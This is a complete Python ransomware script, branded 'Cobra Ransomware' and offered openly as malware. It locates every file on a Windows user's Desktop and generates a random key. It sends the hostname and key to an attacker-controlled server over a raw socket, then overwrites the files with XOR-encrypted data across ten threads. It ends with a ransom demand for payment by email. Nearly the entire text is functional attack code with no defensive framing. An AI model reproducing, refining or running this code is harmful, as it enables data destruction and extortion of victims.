import os
import socket
import random
import threading
import queue

print("""
   _____      _                 _____                                                       
  / ____|    | |               |  __ \                                                      
 | |     ___ | |__  _ __ __ _  | |__) |__ _ _ __  ___  ___  _ __ _____      ____ _ _ __ ___ 
 | |    / _ \| '_ \| '__/ _` | |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \ \ /\ / / _` | '__/ _ \ 
 | |___| (_) | |_) | | | (_| | | | \ \ (_| | | | \__ \ (_) | | | | | \ V  V / (_| | | |  __/
  \_____\___/|_.__/|_|  \__,_| |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|\_/\_/ \__,_|_|  \___|



                           """)
print("""
                                  ████████████████████████████                                
                            ██████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒████▒▒▒▒▒▒██████                          
                      ██████▓▓▒▒▒▒▒▒████▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓████▒▒▒▒▒▒▒▒██████                    
                  ████▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒████                
                ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██              
              ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▓▓▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██            
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒██          
            ██▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██          
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒  ██▒▒▒▒▒▒▒▒▒▒▒▒  ██▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██          
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██          
              ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██████████████░░░░██████████████▓▓▒▒░░▒▒▒▒▒▒▒▒▒▒██            
              ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░██░░░░██░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██            
                ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░██░░░░██░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██              
                ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██              
██████            ██▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒░░░░░░░░▒▒░░░░██░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                
██▒▒▒▒████          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██░░▒▒▒▒░░██░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                  
  ██▒▒▒▒▒▒████        ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▓▓░░░░██▒▒▒▒░░██░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                    
    ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒▒▒▒▒▒▒▒▒░░██░░▓▓░░░░██░░██░░▒▒▒▒▒▒▒▒▒▒▒▒██                      
      ██▒▒▒▒░░▒▒██        ██▒▒▒▒▒▒▒▒▒▒▒▒██░░██▒▒▒▒██░░██▒▒▒▒▒▒▒▒▒▒▒▒██                        
        ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒▒▒▒▒░░░░██░░░░░░░░██░░░░▒▒▒▒▒▒▒▒██                          
          ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒██                            
          ██▒▒▒▒▒▒▒▒██          ██▒▒▒▒▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒██                              
            ██░░▒▒▒▒▒▒██        ██▒▒▒▒▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒██                              
            ██▒▒▒▒▒▒▒▒██          ██▒▒▒▒░░░░░░░░░░░░░░░░▒▒▒▒██                                
              ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                                
              ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒░░░░░░░░░░░░░░░░▒▒▒▒██                                
              ░░██▒▒▒▒▒▒▓▓▓▓      ░░██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██░░                                
                ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██                                  
                ██▒▒▒▒▒▒▒▒██        ██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██                                  
                ██▒▒▒▒▒▒▒▒████████████▒▒▒▒░░░░░░░░░░░░▒▒▒▒████████████                        
                ██▒▒██████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██▒▒▒▒▒▒▒▒▒▒██████                  
                ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████              
              ██▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒██            
              ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██            
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██          
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██          
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██          
            ██░░░░▒▒░░░░░░░░░░▒▒░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░▒▒░░░░░░░░░░▒▒░░░░██          
              ██░░▒▒░░░░░░░░░░▒▒░░░░██▒▒▒▒░░░░░░░░░░░░▒▒▒▒██░░░░▒▒░░░░░░░░░░▒▒░░██            
                ████████████████████████████████████████████████████████████████  ░░▒▒░░▒▒▒▒▒▒

""")
print("YOU HAVE BEEN INFECTED BY COBRA RANSOMWARE")


# Defining the Encryption algorithm
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                # Increment key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
                print(f'{file} Successfully Encrypted')
        except:
            print('Failed to encrypt T_T')
        q.task_done()


# File path
print('Files preparing.....')
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print('Files successfully located')

# Getting the victims hostname
hostname = os.getenv('COMPUTERNAME')

# The Encryption Level
Encryption_level = 512 // 8  # 512 bit encryption
# Generating encryption key
key_character_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>,./;[]{}|'
key_character_pool_length = len(key_character_pool)
print('Encryption key generating.......')
key = ''
for i in range(Encryption_level):
    key += key_character_pool[random.randint(0, key_character_pool_length - 1)]
print('Key is generated')

# Socket (User should put their own IP address as it will be the server)
IP_Address = '192.168.1.9'
PORT = 5678
# Connecting to server to send key and victim name
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(3.0)
    try:
        s.connect((IP_Address, PORT))
        print('Connection established, key and hostname incoming')
        s.send(f'{hostname} : {key}'.encode('utf-8'))
        print('Data sent successfully')
        s.close()
    # If the server is not running the message appear to the victim
    except socket.error:
        print("CONNECTION TO SERVER FAILED, YOU GOT LUCKY THIS TIME")
        s.close()
        input()
        if input == "":
            exit()
        else:
            exit()

# Files are stored in Queue for threads to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Multithreading is used to speed up the process
# Threads getting ready for encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()

print('Encryption and upload completed!!')
print("TO RETRIEVE YOUR FILES AND GET THE DECRYPTER EMAIL XXXXX@XXX.COM WITH PROOF OF PAYMENT")
input()
